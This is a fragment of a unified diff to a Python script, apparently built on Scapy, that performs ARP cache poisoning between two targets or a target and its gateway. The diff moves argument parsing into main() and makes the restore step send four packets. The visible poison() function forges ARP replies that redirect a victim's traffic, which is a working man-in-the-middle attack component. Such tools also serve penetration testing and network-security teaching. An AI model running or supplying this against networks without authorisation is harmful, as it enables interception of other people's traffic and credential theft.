@@ -5,12 +5,6 @@ import argparse
 import sys
 import time
 
-parser = argparse.ArgumentParser()
-parser.add_argument("ip",help="Enter the first target IP address")
-parser.add_argument("ip2",help="Enter the second target IP address - leave blank for gateway", nargs="?")
-args = parser.parse_args()
-
-
 def poison(target1, target2, target1MAC):
     arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, op=2)
     send(arp_reply, verbose=0)
@@ -18,10 +12,15 @@ def poison(target1, target2, target1MAC):
 
 def stop_poison(target1, target2, target1MAC, target2MAC):
     arp_reply = ARP(pdst=target1, hwdst=target1MAC, psrc=target2, hwsrc=target2MAC, op=2)
-    send(arp_reply, verbose=0)
+    send(arp_reply, verbose=0, count=4)
 
 
 def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("ip",help="Enter the first target IP address")
+    parser.add_argument("ip2",help="Enter the second target IP address - leave blank for gateway", nargs="?")
+    args = parser.parse_args()
+
     target1 = args.ip
 
     if args.ip2:
